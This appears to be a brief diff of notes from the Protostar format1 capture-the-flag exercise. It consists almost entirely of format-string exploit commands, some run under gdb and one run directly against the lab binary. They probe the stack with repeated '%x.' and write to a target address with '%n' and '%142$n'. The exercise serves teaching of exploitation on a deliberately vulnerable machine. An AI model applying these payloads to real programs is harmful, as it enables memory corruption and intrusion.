@@ -2,3 +2,5 @@ Padding to last mem dump
 run `python -c 'print "\x38\x96\x04\x08"+"AAABB"+"%x."*143'`%x
 Write
 run `python -c 'print "\x38\x96\x04\x08"+"AAABB"+"%x."*143'`%n
+DMA
+/opt/protostar/bin/format1 `python -c 'print "CC"+"\x38\x96\x04\x08"+"AAA%142$n"'`
